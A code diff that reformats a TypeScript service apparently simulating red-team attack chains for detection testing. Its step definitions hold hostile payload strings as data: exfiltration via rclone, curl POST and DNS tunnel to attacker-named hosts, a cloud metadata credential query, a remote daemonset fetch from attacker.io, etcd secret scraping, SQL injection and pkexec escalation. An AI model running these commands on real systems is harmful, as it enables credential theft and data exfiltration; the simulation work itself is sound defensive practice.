@@ -89,7 +89,8 @@ export class AutonomousRedTeamAgentService {
     const chainId = `chain-redteam-${Date.now().toString(16)}`;
     const intensity = options?.intensityLevel || 'MEDIUM';
     const host = options?.targetHost || 'srv-prod-api-01';
-    const user = options?.targetUser || 'compromised-service-account@enterprise.com';
+    const user =
+      options?.targetUser || 'compromised-service-account@enterprise.com';
 
     let steps: AttackStep[];
 
@@ -126,8 +127,10 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 4,
           mitreTechnique: 'T1567',
           tacticName: 'Exfiltration',
-          description: 'Exfiltration of encrypted SWIFT message ledger to external endpoint',
-          syntheticPayload: 'rclone sync /opt/swift/ledger remote:untrusted-s3-bucket',
+          description:
+            'Exfiltration of encrypted SWIFT message ledger to external endpoint',
+          syntheticPayload:
+            'rclone sync /opt/swift/ledger remote:untrusted-s3-bucket',
           targetResource: 'untrusted-s3-bucket',
           expectedAlertLevel: 'CRITICAL',
         },
@@ -138,8 +141,10 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 1,
           mitreTechnique: 'T1190',
           tacticName: 'Initial Access',
-          description: 'Server-Side Request Forgery (SSRF) to query cloud metadata endpoint',
-          syntheticPayload: 'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/',
+          description:
+            'Server-Side Request Forgery (SSRF) to query cloud metadata endpoint',
+          syntheticPayload:
+            'curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/',
           targetResource: host,
           expectedAlertLevel: 'HIGH',
         },
@@ -147,8 +152,10 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 2,
           mitreTechnique: 'T1059.001',
           tacticName: 'Execution',
-          description: 'Container breakout executing privileged host-level daemonset injection',
-          syntheticPayload: 'kubectl apply -f https://attacker.io/priv-daemonset.yaml --token=***',
+          description:
+            'Container breakout executing privileged host-level daemonset injection',
+          syntheticPayload:
+            'kubectl apply -f https://attacker.io/priv-daemonset.yaml --token=***',
           targetResource: host,
           expectedAlertLevel: 'CRITICAL',
         },
@@ -157,7 +164,8 @@ export class AutonomousRedTeamAgentService {
           mitreTechnique: 'T1003.001',
           tacticName: 'Credential Access',
           description: 'Kubelet token extraction and etcd secret scraping',
-          syntheticPayload: 'etcdctl get /registry/secrets --prefix --keys-only',
+          syntheticPayload:
+            'etcdctl get /registry/secrets --prefix --keys-only',
           targetResource: host,
           expectedAlertLevel: 'CRITICAL',
         },
@@ -165,7 +173,8 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 4,
           mitreTechnique: 'T1048',
           tacticName: 'Exfiltration',
-          description: 'Exfiltration of cluster service-account credentials over DNS tunnel',
+          description:
+            'Exfiltration of cluster service-account credentials over DNS tunnel',
           syntheticPayload: 'dig +short secret.tenant-a.attacker-c2.net',
           targetResource: 'attacker-c2.net',
           expectedAlertLevel: 'CRITICAL',
@@ -178,7 +187,8 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 1,
           mitreTechnique: 'T1190',
           tacticName: 'Initial Access',
-          description: 'Initial Access via SQL Injection probe against Public Gateway',
+          description:
+            'Initial Access via SQL Injection probe against Public Gateway',
           syntheticPayload:
             "SELECT * FROM users WHERE '1'='1' UNION SELECT credit_card FROM payments--",
           targetResource: host,
@@ -198,7 +208,8 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 3,
           mitreTechnique: 'T1068',
           tacticName: 'Privilege Escalation',
-          description: 'Privilege escalation exploiting unpatched kernel capability',
+          description:
+            'Privilege escalation exploiting unpatched kernel capability',
           syntheticPayload: 'pkexec /bin/sh -c "whoami && id"',
           targetResource: host,
           expectedAlertLevel: 'CRITICAL',
@@ -207,8 +218,10 @@ export class AutonomousRedTeamAgentService {
           stepNumber: 4,
           mitreTechnique: 'T1048',
           tacticName: 'Exfiltration',
-          description: 'Exfiltration of encrypted database snapshot to external IP',
-          syntheticPayload: 'curl -X POST -d @/tmp/dump.enc https://34.120.90.1/upload',
+          description:
+            'Exfiltration of encrypted database snapshot to external IP',
+          syntheticPayload:
+            'curl -X POST -d @/tmp/dump.enc https://34.120.90.1/upload',
           targetResource: '34.120.90.1',
           expectedAlertLevel: 'CRITICAL',
         },
@@ -246,7 +259,7 @@ export class AutonomousRedTeamAgentService {
       const detected = true;
       const contained = step.expectedAlertLevel === 'CRITICAL';
       const baseLatency = chain.intensityLevel === 'AGGRESSIVE' ? 35 : 55;
-      const latency = baseLatency + (step.stepNumber * 8);
+      const latency = baseLatency + step.stepNumber * 8;
 
       totalLatency += latency;
       if (detected) detectedCount++;
